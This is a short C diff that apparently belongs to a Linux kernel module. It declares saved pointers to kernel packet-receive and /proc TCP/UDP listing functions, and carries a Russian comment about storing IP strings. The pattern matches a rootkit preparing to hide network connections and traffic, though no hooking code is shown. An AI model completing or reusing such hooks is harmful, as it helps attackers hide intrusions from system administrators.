@@ -1,5 +1,19 @@
 #include "net.h"
 
+// asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs) = NULL;
+int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
+int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
+int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
+asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v) = NULL;
+
+struct Extended_array {
+    void *array_addr;
+    int array_size;
+};
+
 /*
     !Подумать на типом хранения строк с ip
 */
